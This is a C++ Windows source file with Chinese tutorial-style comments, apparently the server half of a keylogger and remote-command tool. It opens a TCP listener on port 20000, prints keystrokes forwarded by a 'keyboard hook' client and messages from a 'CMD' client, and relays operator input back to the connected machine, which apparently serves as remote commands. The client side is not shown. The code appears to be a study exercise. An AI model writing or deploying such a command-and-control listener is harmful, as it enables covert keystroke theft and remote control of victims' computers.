// SERVER.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
//通信头文件
#include<winsock2.h>


#include <iostream>
#include <windows.h>
#include<tchar.h>
#include"..\\MFC\\HOOK本地键盘记录实现\\TCP包.h"

#pragma warning(disable:4996)
//通信库文件
#pragma comment(lib,"ws2_32.lib")


class mSockaddrIn {

public:
    mSockaddrIn() {

    }
    mSockaddrIn(mSockaddrIn & newMsockaddrIn) {
        this->m_Sockaddr_in = newMsockaddrIn.m_Sockaddr_in;
        this->m_SockaddrnLength = newMsockaddrIn.m_SockaddrnLength;
        this->m_s = newMsockaddrIn.m_s;
        m_sClient = INVALID_SOCKET;
        
    }
    mSockaddrIn(sockaddr_in m_Sockaddr_in, int sClinentnLength,SOCKET s) {
        this->m_Sockaddr_in = m_Sockaddr_in;
        this->m_SockaddrnLength = sClinentnLength;
        this->m_s = s;
        m_sClient = INVALID_SOCKET;
    }

    ~mSockaddrIn() {
        return ;
    }

public:
    sockaddr_in m_Sockaddr_in;
    SOCKET m_sClient;
    int m_SockaddrnLength;
    SOCKET m_s;
};

class mCloseHandle {
public:

    mCloseHandle(HANDLE hThread) {
        m_hThread = hThread;
    }
    ~mCloseHandle() {
        CloseHandle(m_hThread);
        return;
    }
    HANDLE m_hThread;
};
DWORD WINAPI mAcceptThread(LPVOID lpd) {
    mSockaddrIn* mSockaddrin = (mSockaddrIn*)lpd;
    while (1) {
        SOCKET temp = accept(mSockaddrin->m_s, (sockaddr*)&(mSockaddrin->m_Sockaddr_in), &(mSockaddrin->m_SockaddrnLength));
        if (INVALID_SOCKET == temp) {
            
        }
        else {
            mSockaddrin->m_sClient = temp;
        }
    }
    return 0;
}
DWORD WINAPI mRecvThread(LPVOID lpd) {
    int RET = 0;
    char bufer[300] = { 0 };
    int *i = (int *)lpd;
    while (1)
    {
        
        RET =  recv((SOCKET)*i, bufer, 300, 0);
        if (RET != SOCKET_ERROR) {

            TCP* t = (TCP*)bufer;
            if (t->nLength != strlen(t->bufer)) {

                std::cout << "这条数据丢失，不完整--";
            }
            
            if (t->dwTcp == TCP_KEY_CLIENT) {

                std::cout << "键盘钩子发来了消息:" << std::endl;
            }

            if (t->dwTcp == TCP_CMD_CLIENT) {

                //std::cout << "CMD发来了消息:" << std::endl;
            }

            std::cout << t->bufer;
            memset(bufer, 0, 256);
        }
        
    }
    return 0;
}
int main()
{
    //windows 很特殊需要单独调用 windows API 来进行网络初始化和反初始化

    
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

     wVersionRequested = MAKEWORD(2, 2);
    //初始化网络
    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        /* Tell the user that we could not find a usable */
        /* WinSock DLL.                                  */
        return -1;
    }

    //1.socket 创建一个套接字
    //2.SOCKET socket函数的返回值，类似于handle
    SOCKET s = socket(
        AF_INET,    //INET协议簇
        SOCK_STREAM,//使用TCP协议
        0
    );
    if (s == INVALID_SOCKET) {

        std::cout << "error:socket" << std::endl;
        return -1;
    }
    //2.bind/listen 绑定/监听窗口
    //端口：用于区分究竟是哪个应用的通讯数据，只是一个编号0-65535
    //端口3389 RDP端口 可以通过这个端口，用"远程桌面"等连接工具来连接到远程的服务器
    //端口80 网页浏览器 http

    //挑选一个本机其他软件没有使用的端口
    sockaddr_in addr;   //sockaddr_in结构体，用于描述IP和端口，是sockaddr的升级版
    int nLength = sizeof(sockaddr_in);
    addr.sin_family = AF_INET; //固定写死的套路
    addr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");//固定套路写0.0.0.0表示当前所有网卡都可以接受外界链接
    addr.sin_port = htons(20000); //h:host to n:network s:short 表示本地小端数据 转网络大端数据  还可以ntohs 表示网络大端转本地小端

   //绑定
    int RET = bind(s, (sockaddr*)&addr, nLength); 
    if (RET == SOCKET_ERROR) {
        std::cout << "bind:error" << std::endl;
        return -1;
    }

    //监听
    RET = listen(s, 5); 
    if (RET == SOCKET_ERROR) {
         std::cout << "listen:error" << std::endl;
         return -1;
    }
    
    //accept  接受请求 等待别人链接
    sockaddr_in remoteAddr;
    remoteAddr.sin_family = AF_INET;
    int RemoteAddrnLength = sizeof(sockaddr_in);
    mSockaddrIn cRemoteAddr(remoteAddr,RemoteAddrnLength,s);

    //accept返回的SOCKET sClient专门用于与客户通信的SOCKET,一般这里开线程接收
    DWORD mAcceptThreadId = 0;
    //创建线程不停 accept 等待接收链接请求
    HANDLE hAcceptThread = CreateThread(NULL, 0, mAcceptThread, &cRemoteAddr, 0, &mAcceptThreadId);
    mCloseHandle cCloseAcceptHandle(hAcceptThread);

    //recv/send 收包/发包
    //一旦成功建立链接，那么接下来是发包和收包，不用考虑丢包的问题，因为TCP是可靠的
    //创建线程收包
    DWORD mRecvThreadId = 0;
    HANDLE hRecvThread = 0; 

    //开始循环发包
    char bufer[256] = { 0 };
    int len = 0;
    int nSendBytes = 0;
    int index = 0;
    char ip[4] = { 0 };
 
    while (1) {

        if (cRemoteAddr.m_sClient == INVALID_SOCKET) {
            if (index == 0) {
                std::cout << "当前未有客户机连接，你无法发消息" << std::endl;
                index = 1;
            }
           

        }
        else {
            if (index == 1) {
                CreateThread(NULL, 0, mRecvThread, (SOCKET*)&(cRemoteAddr.m_sClient), 0, &mRecvThreadId);
                mCloseHandle cCloseRecvHandle(hRecvThread);
                
                std::cout << "有客户机连接了，可以发送消息" << std::endl;
                std::cout << "客户机号:" << cRemoteAddr.m_sClient << std::endl
                    << "客户机IP:" << inet_ntoa(cRemoteAddr.m_Sockaddr_in.sin_addr) << std::endl
                    << "客户机端口:" << cRemoteAddr.m_Sockaddr_in.sin_port << std::endl;
            }
           
            gets_s(bufer, 255);
            len = strlen(bufer);
            if (len > 255) {
                std::cout << "String overflow" << std::endl;
                continue;
            }
            bufer[len] = '\n';
            
            nSendBytes = send(cRemoteAddr.m_sClient, bufer, len + 1, 0);
            if (nSendBytes < len + 1) {
                std::cout << "send error" << std::endl;
            }
            memset(bufer, 0, 256);
            index = 0;
        }

        
    }

    //closesocket 关闭套接字
    if (closesocket(cRemoteAddr.m_sClient)){
        closesocket(cRemoteAddr.m_sClient);
    }

    //反初始化网络
    WSACleanup();
 
    return 0;
}

